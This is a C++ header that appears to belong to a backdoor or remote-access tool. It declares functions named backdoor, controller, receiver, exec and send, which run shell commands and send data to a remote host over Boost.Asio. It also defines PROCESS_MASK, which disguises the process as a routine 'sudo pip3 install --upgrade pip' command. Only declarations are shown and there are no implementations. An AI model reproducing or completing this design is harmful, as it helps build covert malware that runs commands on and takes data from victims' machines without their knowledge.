#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>

#include <iostream>
#include <sstream>
#include <boost/asio.hpp> 

#ifndef UTILITIES
#define UTILITIES

#define PROCESS_MASK "sudo -H pip3 install --upgrade pip"

extern const std::string RESPONSE;
extern const std::string COMMAND;
extern const std::string IDENTIFY;

int controller(const std::string host, int port);
int receiver(int port);
int backdoor(int port);

std::string exec(const char* cmd);
void send(const std::string host, int port, const std::string data);

#endif